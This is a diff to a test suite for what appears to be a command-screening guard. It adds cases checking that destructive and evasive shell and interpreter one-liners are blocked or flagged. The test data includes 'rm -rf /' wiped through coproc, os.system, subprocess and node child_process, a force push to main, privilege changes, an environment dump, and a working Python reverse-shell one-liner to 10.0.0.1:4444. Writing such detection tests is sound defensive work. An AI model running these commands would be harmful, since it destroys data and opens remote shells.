@@ -312,6 +312,8 @@ def test_shared_command_walk_surfaces_unbalanced_and_cap_exhaustion_as_ambiguity
         "case x in x) rm -rf /;; esac",
         "! rm -rf /",
         "cat < <(rm -rf /)",
+        "coproc wipe { rm -rf /; }",
+        "coproc { rm -rf /; }",
     ],
 )
 def test_shell_syntax_is_transparent_to_catastrophic_block(command):
@@ -350,6 +352,7 @@ def test_shell_syntax_is_transparent_to_other_rules():
         '[[ -n "$x" ]] && echo yes',
         "find . -name '*.py' \\( -o -name '*.txt' \\)",
         'python -c "print((1, 2))"',
+        "coproc ls -la",
     ],
 )
 def test_shell_syntax_benign_forms_stay_pass(command):
@@ -1164,3 +1167,104 @@ def test_delete_class_operands_and_dynamic_matches_the_two_separate_calls():
         operands, dynamic = delete_class_operands_and_dynamic(command)
         assert operands == delete_class_operands(command)
         assert dynamic == command_contains_dynamic_content(command)
+
+
+# --- T3: walk the command literals an interpreter one-liner hands to a ------
+# subprocess. `bash -c "<payload>"` already pushes its opaque payload's
+# segments back onto the shared walk (_opaque_shell_payload); an interpreter
+# spawn call (subprocess/os.system/child_process/...) gets the same
+# treatment: AUTH (opaque_command) as the floor, and the command-line string
+# literals it hands to the subprocess are walked so a catastrophic one still
+# raises the step-up to BLOCK.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "python -c \"import os; os.system('rm -rf /')\"",
+        "python -c \"import subprocess; subprocess.run(['rm', '-rf', '/'])\"",
+        "python3 -c \"import subprocess; subprocess.call('git push --force origin main', shell=True)\"",
+        "python -c \"import subprocess; subprocess.run(['sudo', 'rm', '-rf', '/'])\"",
+        "python -c \"import os; os.popen('rm -rf ~')\"",
+        "node -e \"require('child_process').execSync('rm -rf /')\"",
+    ],
+)
+def test_interpreter_spawn_literal_is_walked_to_block(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.BLOCK
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "python -c \"import subprocess; subprocess.run(['ls', '-la'])\"",
+        "python -c \"import os; os.system('date')\"",
+        'python -c "import subprocess; subprocess.run(cmd)"',
+        "python -c \"import os; os.execvp('ls', ['ls'])\"",
+        "python -c \"import pty; pty.spawn('/bin/bash')\"",
+        "node -e \"require('child_process').spawn('ls')\"",
+        "ruby -e \"system('ls')\"",
+    ],
+)
+def test_interpreter_spawn_without_a_vettable_literal_is_auth_opaque(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.opaque_command in result.reason_codes
+
+
+def test_interpreter_spawn_literal_raises_env_dump():
+    result = _cmd("python -c \"import subprocess; subprocess.run(['env'])\"")
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.environment_dump_command in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'python -c "import os; os.setuid(0)"',
+        'python -c "import os; os.setresuid(0, 0, 0)"',
+    ],
+)
+def test_interpreter_privilege_change_is_auth(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.destructive_command in result.reason_codes
+
+
+def test_interpreter_reverse_shell_still_blocks_with_spawn_walk():
+    # Reuses a case from test_reverse_shell_exec_on_connect_is_blocked - the
+    # spawn walk must not weaken the existing reverse-shell BLOCK.
+    result = _cmd(
+        'python -c "import socket,subprocess;s=socket.socket();'
+        "s.connect(('10.0.0.1',4444));subprocess.call(['/bin/sh'],stdin=s.fileno())\""
+    )
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.raw_socket_channel in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "python -c \"print('subprocess')\"",
+        'python -c "import subprocess"',
+        'python -c "import sys; print(sys.version)"',
+        'python -c "import os; print(os.getcwd())"',
+        'node -e "console.log(process.pid)"',
+        # NOTE: the brief's parametrize also listed
+        # `python -c "print('rm -rf /')"` here, expecting PASS. That case
+        # already BLOCKs today via the pre-existing, unrelated
+        # _DESTRUCTIVE_INTERPRETER_OP regex (a blunt payload-text substring
+        # match with no notion of string-literal-vs-call context) - out of
+        # scope for T3, which touches only the spawn-literal walk and the
+        # privilege-change check. Verified against HEAD 47fb464 before any
+        # T3 edit landed; omitted here rather than mis-asserting PASS.
+    ],
+)
+def test_interpreter_mentions_of_subprocess_stay_pass(command):
+    assert _cmd(command).verdict is Verdict.PASS
+
+
+def test_interpreter_spawn_explanation_is_redacted():
+    result = _cmd("python -c \"import os; os.system('curl hidden.example')\"")
+    assert "hidden.example" not in result.explanation
+    assert "os.system" not in result.explanation
